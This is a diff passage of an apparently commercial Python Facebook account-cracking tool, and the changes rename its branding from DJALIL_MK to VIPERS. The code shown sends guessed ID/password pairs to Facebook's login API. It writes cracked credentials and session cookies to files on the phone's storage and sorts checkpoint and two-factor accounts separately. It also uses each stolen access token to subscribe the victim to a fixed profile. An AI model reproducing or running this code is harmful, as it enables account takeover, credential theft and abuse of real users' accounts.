                                 elif twf in str(po):
                                         if 'y' in pcp:
-                                                #print('\r\r\033[1;34m<[DJALIL_MK-2F]> '+ids+' | '+pas)
-                                                open('/sdcard/DJALIL_MK-2F.txt','a').write(ids+'|'+pas+'\n')
+                                                #print('\r\r\033[1;34m<[VIPERS-2F]> '+ids+' | '+pas)
+                                                open('/sdcard/VIPERS-2F.txt','a').write(ids+'|'+pas+'\n')
                                                 twf.append(ids)
                                                 break
               
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-                                                open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\x1b[38;5;246m<[VIPERS-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/VIPERS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/VIPERS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -561,7 +559,7 @@ def M_file_2(ids,names,passlist):
                 try:
                         global ok, loop
                         boos = random.choice([P, M, H, K, B, U, O, N])
-                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
+                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-VIPERS\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                         sys.stdout.flush()
                         
                         fn = names.split(' ')[0]
@@ -586,29 +584,29 @@ def M_file_2(ids,names,passlist):
                                 
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
-                                        print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        print('\r\x1b[1;92m<[VIPERS-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                         print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
                                         token = q['access_token']
                                         requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
-                                        open('/sdcard/DJALIL_MK_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/DJALIL_MK_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                                        open('/sdcard/VIPERS_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/VIPERS_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         oks.append(ids)
                                         break
                                         
                                 elif twf in str(po):
                                         if 'y' in pcp:
-                                                #print('\r\r\033[1;34m<[DJALIL_MK-2F]> '+ids+' | '+pas)
-                                                open('/sdcard/DJALIL_MK-2F.txt','a').write(ids+'|'+pas+'\n')
+                                                #print('\r\r\033[1;34m<[VIPERS-2F]> '+ids+' | '+pas)
+                                                open('/sdcard/VIPERS-2F.txt','a').write(ids+'|'+pas+'\n')
                                                 twf.append(ids)
                                                 break
         
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-                                                open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\x1b[38;5;246m<[VIPERS-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/VIPERS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/VIPERS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -626,7 +624,7 @@ def M_file_3(ids,names,passlist):
                 try:
                         global ok,loop
                         boos = random.choice([P, M, H, K, B, U, O, N])
-                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
+                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-VIPERS\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                         sys.stdout.flush()
                         
                         fn = names.split(' ')[0]
@@ -658,16 +656,16 @@ def M_file_3(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        print('\r\x1b[1;92m<[VIPERS-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                         token = q['access_token']
                                         requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
-                                        open('/sdcard/DJALIL_MK_m3_OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/VIPERS_m3_OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-                                                open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\x1b[38;5;246m<[VIPERS-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/VIPERS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -683,7 +681,7 @@ def M_file_44(ids,names,passlist):
         try:
                 global ok,loop,sim_id
                 boos = random.choice([P, M, H, K, B, U, O, N])
-                sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
+                sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-VIPERS\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -771,26 +769,26 @@ def M_file_44(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        print('\r\x1b[1;92m<[VIPERS-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         coki="sb=shawXD01;"+coki
-                                        open('/sdcard/DJALIL_MK_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
-                                        open('/sdcard/DJALIL_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
+                                        open('/sdcard/VIPERS_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
+                                        open('/sdcard/VIPERS_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                #print('\r\r\033[1;34m<[DJALIL_MK-2F]> '+ids+' | '+pas)
+                                                #print('\r\r\033[1;34m<[VIPERS-2F]> '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-                                                open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\x1b[38;5;246m<[VIPERS-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/VIPERS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/VIPERS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -803,7 +801,7 @@ def M_file_4(ids, names, passlist):
 	try:
 		global ok, loop,  sim_id
 		boos = random.choice([P, M, H, K, B, U, O, N])
-		sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)));sys.stdout.flush()
+		sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-VIPERS\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)));sys.stdout.flush()
         
 		fn = names.split(' ')[0]
 		try:
@@ -831,8 +829,8 @@ def M_file_4(ids, names, passlist):
 			url = 'https://b-graph.facebook.com/auth/login'
 			po = requests.post(url,params=data,headers=head,allow_redirects=False).json()
 			if 'session_key' in po:
-				print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-				open('/sdcard/DJALIL_MK_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
+				print('\r\x1b[1;92m<[VIPERS-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+				open('/sdcard/VIPERS_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
 				session = po['session_cookies']
 				cookie = ''
 				cuser = session[0]
@@ -847,15 +845,15 @@ def M_file_4(ids, names, passlist):
 				pagevoice = cuser.replace('c_user','m_page_voice')
 				cookie+=pagevoice
 				print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m " + cookie)
-				open('/sdcard/DJALIL_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
+				open('/sdcard/VIPERS_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
 				#token = po['access_token']
 				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				    if 'y' in pcp:
-					        print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-					        open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					        print('\r\x1b[38;5;246m<[VIPERS-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+					        open('/sdcard/VIPERS-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					        cps.append(ids)
 					        break
 				            
@@ -905,7 +903,7 @@ def approval():
         Trial(sec[1])
     if 'Napv' in sec:
       boos = random.choice([P, M, H, K, B, U, O, N])
-      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}DJALIL_MK+\033[1;32m"+sec.replace('Napv',''))
+      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}VIPERS+\033[1;32m"+sec.replace('Napv',''))
       print('\033[1;34m─────────────────────────────────────────────')
       print(' \033[1;32m[\033[1;31m–\033[1;32m] You are not premuim user first buy premuim ')
       print('\033[1;34m-─────────────────────────────────────────────')
